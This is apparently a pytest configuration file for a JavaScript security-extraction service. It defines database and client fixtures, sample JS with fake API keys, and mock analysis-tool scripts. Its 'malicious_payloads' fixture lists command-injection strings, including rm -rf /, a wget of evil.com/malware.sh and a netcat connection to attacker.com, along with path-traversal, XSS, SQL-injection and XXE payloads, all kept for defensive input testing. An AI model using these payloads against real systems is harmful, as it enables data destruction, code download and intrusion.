"""
Pytest configuration and fixtures for JS Security Extractor tests.
"""
import pytest
import tempfile
import os
import shutil
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from fastapi.testclient import TestClient

from app.main import app
from app.db import Base, get_db


# Test database setup
@pytest.fixture(scope="session")
def test_db_engine():
    """Create test database engine."""
    # Use in-memory SQLite for testing
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False}
    )
    
    # Create all tables
    Base.metadata.create_all(bind=engine)
    
    yield engine
    
    # Cleanup
    Base.metadata.drop_all(bind=engine)


@pytest.fixture(scope="function")
def test_db_session(test_db_engine):
    """Create test database session."""
    TestingSessionLocal = sessionmaker(
        autocommit=False, 
        autoflush=False, 
        bind=test_db_engine
    )
    
    session = TestingSessionLocal()
    
    yield session
    
    session.rollback()
    session.close()


@pytest.fixture(scope="function")
def test_client(test_db_session):
    """Create test client with test database."""
    def override_get_db():
        try:
            yield test_db_session
        finally:
            pass
    
    app.dependency_overrides[get_db] = override_get_db
    
    with TestClient(app) as client:
        yield client
    
    app.dependency_overrides.clear()


# File system fixtures
@pytest.fixture(scope="function")
def temp_storage_dir():
    """Create temporary storage directory for tests."""
    temp_dir = tempfile.mkdtemp(prefix="js_extractor_test_")
    
    # Set environment variable
    os.environ["STORAGE_PATH"] = temp_dir
    
    yield temp_dir
    
    # Cleanup
    try:
        shutil.rmtree(temp_dir)
    except:
        pass
    
    # Restore original environment
    if "STORAGE_PATH" in os.environ:
        del os.environ["STORAGE_PATH"]


@pytest.fixture(scope="function")
def sample_js_files():
    """Create sample JavaScript files for testing."""
    files = {}
    
    # Basic JavaScript file
    files['basic'] = """
    function hello() {
        console.log('Hello, World!');
        fetch('/api/users');
        return 'success';
    }
    """
    
    # File with secrets
    files['with_secrets'] = """
    const config = {
        apiKey: 'sk_live_1234567890abcdef',
        password: 'super_secret_password',
        token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
    };
    
    function authenticate() {
        return fetch('/api/auth', {
            headers: {
                'Authorization': 'Bearer ' + config.token
            }
        });
    }
    """
    
    # File with multiple endpoints
    files['with_endpoints'] = """
    class ApiClient {
        async getUsers() {
            return axios.get('/api/v1/users');
        }
        
        async getData() {
            return fetch('https://api.example.com/data');
        }
        
        async updateProfile(data) {
            return axios.post('/api/profile', data);
        }
    }
    """
    
    # Minified file
    files['minified'] = """!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define(t):(e=e||self).myLib=t()}(this,function(){"use strict";function e(){fetch("/api/data")}return e});"""
    
    # File with dependencies
    files['with_dependencies'] = """
    import React from 'react';
    import axios from 'axios';
    import { debounce } from 'lodash';
    
    const Component = () => {
        const handleClick = debounce(() => {
            axios.get('/api/search');
        }, 300);
        
        return React.createElement('button', { onClick: handleClick });
    };
    
    export default Component;
    """
    
    # File with suspicious patterns
    files['suspicious'] = """
    function maliciousFunction() {
        eval(userInput);
        document.write('<script>' + untrustedData + '</script>');
        innerHTML = '<div>' + userContent + '</div>';
        localStorage.setItem('password', sensitiveData);
    }
    """
    
    yield files


@pytest.fixture(scope="function")
def sample_source_map():
    """Sample source map for testing."""
    return {
        "version": 3,
        "sources": ["src/app.js", "src/utils.js"],
        "sourcesContent": [
            "function app() {\n  console.log('App started');\n  fetch('/api/init');\n}",
            "export function utils() {\n  return 'utility';\n}"
        ],
        "mappings": "AAAA,SAASA,KACP,QAAQC,IAAI,eACZ,MAAM,YACR",
        "names": ["app", "log"],
        "file": "app.min.js"
    }


# Mock fixtures for external dependencies
@pytest.fixture(scope="function")
def mock_jsluice_binary():
    """Mock jsluice binary for testing."""
    script_content = '''#!/bin/bash
    if [ "$1" = "--help" ]; then
        echo "jsluice - JavaScript analysis tool"
        exit 0
    elif [ "$1" = "urls" ]; then
        if [ "$#" -gt 1 ] && [ -f "$3" ]; then
            # Extract basic patterns from the file
            if grep -q "fetch" "$3"; then
                echo '{"url": "/api/users", "line": 1, "source": "fetch"}'
            fi
            if grep -q "axios" "$3"; then
                echo '{"url": "https://api.example.com/data", "line": 2, "source": "axios"}'
            fi
        fi
        exit 0
    elif [ "$1" = "secrets" ]; then
        if [ "$#" -gt 1 ] && [ -f "$2" ]; then
            if grep -q "sk_live_" "$2"; then
                echo '{"match": "sk_live_1234567890abcdef", "rule": "stripe_secret", "confidence": "high"}'
            fi
            if grep -q "password" "$2"; then
                echo '{"match": "super_secret_password", "rule": "password", "confidence": "medium"}'
            fi
        fi
        exit 0
    fi
    exit 1
    '''
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as f:
        f.write(script_content)
        f.flush()
        os.chmod(f.name, 0o755)
        yield f.name
    
    try:
        os.unlink(f.name)
    except:
        pass


@pytest.fixture(scope="function")
def mock_sourcemapper_binary():
    """Mock sourcemapper binary for testing."""
    script_content = '''#!/bin/bash
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "sourcemapper - Source map processing tool"
        exit 0
    elif [ "$1" = "-output" ] && [ -n "$2" ]; then
        # Create mock output directory and files
        mkdir -p "$2/src"
        echo 'function app() { console.log("Original source"); }' > "$2/src/app.js"
        echo 'export function utils() { return "utility"; }' > "$2/src/utils.js"
        echo "Processed source map successfully" >&2
        exit 0
    fi
    exit 1
    '''
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as f:
        f.write(script_content)
        f.flush()
        os.chmod(f.name, 0o755)
        yield f.name
    
    try:
        os.unlink(f.name)
    except:
        pass


# Security test fixtures
@pytest.fixture(scope="function")
def malicious_payloads():
    """Collection of malicious payloads for security testing."""
    return {
        'command_injection': [
            '; rm -rf /',
            '$(rm -rf /)',
            '`cat /etc/passwd`',
            '|| wget http://evil.com/malware.sh',
            '& netcat attacker.com 4444',
        ],
        'path_traversal': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
            '....//....//....//etc//passwd',
        ],
        'xss': [
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert("XSS")</script>',
        ],
        'sql_injection': [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'; DELETE FROM sessions; --",
            "1' UNION SELECT password FROM users--",
        ],
        'xxe': [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.xml">]><foo>&xxe;</foo>',
        ]
    }


# Performance test fixtures
@pytest.fixture(scope="function")
def large_js_content():
    """Generate large JavaScript content for performance testing."""
    base_content = """
    function largeFunction{index}() {{
        const data = {data};
        fetch('/api/endpoint{index}');
        const secret = 'secret_key_{index}';
        return axios.get('https://api{index}.example.com/data');
    }}
    """
    
    # Generate large content with multiple functions
    content_parts = []
    for i in range(100):
        data = "{{key{}: 'value{}' for j in range(10)}}".format(i, i)
        content_parts.append(
            base_content.format(index=i, data=data)
        )
    
    return '\n'.join(content_parts)


# Utility functions for tests
def create_test_session_data(db_session, num_files=3):
    """Create test session data in database."""
    from app.models import Session as DbSession, File as DbFile
    import uuid
    
    # Create session
    session_id = uuid.uuid4()
    db_session_obj = DbSession(id=session_id)
    db_session.add(db_session_obj)
    
    # Create files
    file_ids = []
    for i in range(num_files):
        file_obj = DbFile(
            session_id=session_id,
            url=f"https://example.com/file{i}.js",
            content_hash=f"hash{i}",
            content_type="application/javascript",
            content_length=100 + i,
            stored_path=f"/tmp/file{i}.js",
            file_metadata={"index": i}
        )
        db_session.add(file_obj)
        db_session.flush()
        file_ids.append(file_obj.id)
    
    db_session.commit()
    
    return {
        'session_id': str(session_id),
        'file_ids': [str(fid) for fid in file_ids]
    }


# Pytest hooks for custom test reporting
def pytest_configure(config):
    """Configure pytest with custom markers and settings."""
    config.addinivalue_line(
        "markers", "security: mark test as security-focused"
    )
    config.addinivalue_line(
        "markers", "integration: mark test as integration test"
    )
    config.addinivalue_line(
        "markers", "slow: mark test as slow running"
    )


def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers automatically."""
    for item in items:
        # Add security marker to security tests
        if "security" in item.name.lower() or "malicious" in item.name.lower():
            item.add_marker(pytest.mark.security)
        
        # Add integration marker to API tests
        if "api" in str(item.fspath).lower() or "endpoint" in item.name.lower():
            item.add_marker(pytest.mark.integration)
        
        # Add slow marker to performance tests
        if "large" in item.name.lower() or "performance" in item.name.lower():
            item.add_marker(pytest.mark.slow)